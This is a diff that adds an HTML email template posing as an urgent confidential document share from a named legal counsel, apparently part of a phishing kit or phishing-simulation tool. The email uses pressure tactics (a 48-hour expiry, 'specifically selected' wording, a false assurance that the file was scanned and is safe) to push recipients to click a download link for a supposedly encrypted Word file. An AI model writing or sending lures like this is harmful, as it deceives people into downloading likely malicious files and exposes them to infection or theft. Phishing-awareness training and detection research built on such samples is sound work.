@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Document Shared - Action Required</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f8f9fa;
+            color: #212529;
+        }
+        
+        .email-container {
+            max-width: 600px;
+            margin: 20px auto;
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            padding: 25px 30px;
+            text-align: center;
+            border-bottom: 3px solid #1976d2;
+        }
+        
+        .header img {
+            height: 32px;
+            margin-bottom: 10px;
+        }
+        
+        .header h1 {
+            color: white;
+            margin: 0;
+            font-size: 24px;
+            font-weight: 600;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+        }
+        
+        .urgent-banner {
+            background-color: #ff6b35;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            font-weight: 600;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .sender-info {
+            background-color: #f8f9fa;
+            border-left: 4px solid #28a745;
+            padding: 20px;
+            margin-bottom: 25px;
+            border-radius: 0 4px 4px 0;
+        }
+        
+        .sender-name {
+            font-size: 18px;
+            font-weight: 700;
+            color: #2c3e50;
+            margin-bottom: 5px;
+        }
+        
+        .share-message {
+            color: #6c757d;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+        
+        .document-preview {
+            background: linear-gradient(145deg, #ffffff 0%, #f8f9fa 100%);
+            border: 2px solid #e9ecef;
+            border-radius: 8px;
+            padding: 25px;
+            text-align: center;
+            margin-bottom: 25px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .document-preview::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #ff6b35, #f7931e, #ffc107);
+        }
+        
+        .doc-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 15px;
+            background: linear-gradient(135deg, #4285f4 0%, #34a853 100%);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .doc-icon svg {
+            width: 40px;
+            height: 40px;
+            fill: white;
+        }
+        
+        .document-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #2c3e50;
+            margin-bottom: 8px;
+        }
+        
+        .document-size {
+            color: #6c757d;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .urgency-text {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        
+        .urgency-text strong {
+            color: #856404;
+            font-size: 15px;
+        }
+        
+        .action-button {
+            display: inline-block;
+            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+            color: white;
+            padding: 15px 35px;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 16px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .action-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.4);
+        }
+        
+        .button-container {
+            text-align: center;
+            margin: 30px 0;
+        }
+        
+        .security-notice {
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 6px;
+            padding: 20px;
+            margin-top: 25px;
+            font-size: 13px;
+            color: #6c757d;
+            line-height: 1.5;
+        }
+        
+        .footer {
+            background-color: #343a40;
+            color: #adb5bd;
+            padding: 20px 30px;
+            text-align: center;
+            font-size: 12px;
+            line-height: 1.6;
+        }
+        
+        .confidential {
+            background-color: #e74c3c;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            display: inline-block;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        @media (max-width: 600px) {
+            .email-container {
+                margin: 10px;
+                border-radius: 0;
+            }
+            
+            .content {
+                padding: 20px;
+            }
+            
+            .header {
+                padding: 20px;
+            }
+            
+            .header h1 {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="email-container">
+        <!-- Header -->
+        <div class="header">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAgAAAAIACAYAAAD0eNT6AAAgAElEQVR4XuydB3RU17n991UBIQkhei8SxfRmwHRTXDHuNqCRTYrzXvqznfxf8l4SJ7w0x3ZsDZC4Jo7jGIMxBgwGTO9V9I6QNCMhgZCEQBXVuf91BuNgDEgjnXPL3H3WYuFy7/6+8/uONHvuPUWDHdusWSHdC24bWROKgZqODtDQQdN9HXRoHQCIP60AaHbsGnMmARKwJIEaTcMpXdf36Rr2QdN3e197apclM2VSJFBHArb5kOz0/MIm4b6au3VNf1gDpgJoU8c+8jISIAESkE5AA5b6wsO+731lWo50cQqSgAEELG8A4p+b/4AO/T8B3A2giQFMGIIESIAE6kqgQNO0H6cnJXxY1xt4HQlYhYBlDUD8swuG65rvZQATrAK.." alt="Document Sharing Platform">
+            <h1>CONFIDENTIAL DOCUMENT SHARED</h1>
+        </div>
+        
+        <!-- Urgent Banner -->
+        <div class="urgent-banner">
+            ⚠️ TIME-SENSITIVE DOCUMENT - IMMEDIATE ATTENTION REQUIRED
+        </div>
+        
+        <!-- Content -->
+        <div class="content">
+            <div class="confidential">CONFIDENTIAL</div>
+            
+            <div class="sender-info">
+                <div class="sender-name">📁 WILLIAM GARY PARKS</div>
+                <div style="color: #6c757d; font-size: 14px;">Senior Legal Counsel • Document Review Department</div>
+            </div>
+            
+            <div class="share-message">
+                <strong>You have been specifically selected</strong> to review a confidential document that requires your immediate attention. This document contains sensitive information that must be reviewed within the next 48 hours.
+            </div>
+            
+            <div class="document-preview">
+                <div class="doc-icon">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M14,2H6A2,2 0 0,0 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2M18,20H6V4H13V9H18V20Z"/>
+                    </svg>
+                </div>
+                <div class="document-title">Scan_Document_Confidential.docx</div>
+                <div class="document-size">📊 204.6 KB • Encrypted Document</div>
+                <div style="font-size: 12px; color: #856404; background-color: #fff3cd; padding: 8px; border-radius: 4px; margin-top: 10px;">
+                    🔒 This document is password-protected and encrypted for your security
+                </div>
+            </div>
+            
+            <div class="urgency-text">
+                <strong>⏰ URGENT REVIEW REQUIRED</strong><br>
+                This document contains time-sensitive information that requires your immediate review and response. Access expires in 48 hours.
+            </div>
+            
+            <div class="button-container">
+                <a href="/api/download/word-free" class="action-button">
+                    🔓 SECURE ACCESS DOCUMENT
+                </a>
+            </div>
+            
+            <div class="security-notice">
+                <strong>🔐 Security Notice:</strong> This document has been scanned for malware and is safe to open. 
+                By accessing this document, you acknowledge that you are authorized to view confidential information. 
+                Please ensure you are in a secure environment before opening.<br><br>
+                <strong>Access Code:</strong> WGP-2024-CONF-7829<br>
+                <strong>Tracking ID:</strong> DOC-REV-#{randomNumber}
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <strong>Document Security Center</strong><br>
+            This is an automated message from our secure document sharing system.<br>
+            If you received this in error, please disregard this message.<br><br>
+            
+            <div style="font-size: 11px; opacity: 0.7; margin-top: 10px;">
+                This email was sent from a secure server. Document access is monitored and logged for security purposes.
+                For technical support, contact IT Security Department.
+            </div>
+        </div>
+    </div>
+</body>
+</html>
